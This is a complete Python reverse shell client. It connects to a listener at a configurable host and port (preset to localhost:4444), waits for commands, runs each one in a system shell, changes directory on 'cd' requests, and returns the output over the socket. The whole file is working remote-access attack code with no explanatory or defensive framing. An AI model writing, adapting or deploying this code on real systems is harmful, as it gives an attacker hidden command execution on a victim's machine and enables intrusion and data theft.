import os
import socket
import subprocess

LHOST = "127.0.0.1"
LPORT = 4444

s = socket.socket()
s.connect((LHOST, LPORT))
msg = s.recv(1024).decode()

print('[*] server:' + msg)

current_dir = os.getcwd()  

while True:
    cmd = s.recv(1024).decode()
    print(f'[+] received command : {cmd}')

    if cmd.lower() in ['q', 'quit', 'x', 'ex', 'exit']:
        break

    if cmd.startswith('cd '):  
        try:
            path = cmd[3:].strip() 
            os.chdir(path)  
            current_dir = os.getcwd() 
            result = f'[+] Changed directory to {current_dir}'.encode()
        except Exception as e:
            result = str(e).encode()
    else:
        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True, cwd=current_dir)
        except Exception as e:
            result = str(e).encode()

    if len(result) == 0:
        result = '[+] Executed Successfully'.encode()

    s.send(result)

s.close()
